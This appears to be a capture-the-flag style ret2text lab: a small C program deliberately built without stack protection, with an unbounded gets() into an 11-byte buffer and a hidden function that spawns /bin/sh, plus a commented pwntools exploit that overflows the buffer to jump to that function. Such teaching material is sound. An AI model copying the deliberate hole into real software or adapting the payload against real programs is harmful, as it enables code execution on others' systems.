// gcc -fno-stack-protector -no-pie -m32 -o ret2text ret2text.c

#include "stdio.h"
#include "stdlib.h"


void Sys()
{
    system("/bin/sh");
}

void ovfl()
{
    int a=12;
    char b[11];
    gets(b);
}
int main()
{
    ovfl();
    return 0;
}

/**
from pwn import *
p = process('./text2r')
pload = 'A'*27 + p32(0x80491b6) #'A'*27为填充字节，0x80491b6是Sys函数的地址
#gdb.attach(p)  ：在exp中进行gdb调试
p.send(pload)
p.interactive()
*/